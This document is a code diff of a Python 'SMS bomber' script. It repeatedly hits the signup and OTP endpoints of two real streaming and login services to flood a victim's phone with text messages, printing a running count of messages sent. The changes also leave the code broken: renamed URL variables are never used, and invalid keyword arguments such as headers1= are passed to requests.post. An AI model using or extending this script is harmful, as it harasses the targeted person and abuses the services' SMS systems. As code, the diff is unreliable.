@@ -8,7 +8,7 @@ amount = int(input("Enter Your Amount: "))
 #Our First API Function
 def api1():
     #API URL
-    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+    url1 = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
     
     #API Data
     data = {
@@ -24,7 +24,7 @@ def api1():
     }
     
     #Request Our API
-    response = requests.post(url, json = data, headers = headers).status_code
+    response = requests.post(url, json = data, headers1 = headers1).status_code
     
     #Return Our Response Staus Code
     return response
@@ -32,7 +32,7 @@ def api1():
 #Our Second API Function
 def api2():
     #API URL
-    url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
+    url2 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
     
     #API Data
     data = {
@@ -41,12 +41,12 @@ def api2():
     }
     
     #Request Header
-    headers = {
+    headers2 = {
         "Content-Type" : "application/json"
     }
     
     #Request Our API
-    response = requests.post(url, json = data, headers = headers).status_code
+    response = requests.post(url, json = data, headers2 = headers2).status_code
     
     #Return Our Response Status Code
     return response
@@ -61,6 +61,17 @@ done = 0
 while True:
     #Calling Our First API
     code = api1()
+    
+    #If Our Request Is Successfull, Than Do This
+    if (code == 200):
+        done += 1
+        print(str(done) + " Sms Sent Successfully!!")
+    #If Not Successfull, Than Do This
+    else:
+        print("Sms Send Failed!")
+
+    #Calling Our Second API
+    code = api2()
     
     #If Our Request Is Successfull, Than Do This
     if (code == 200):
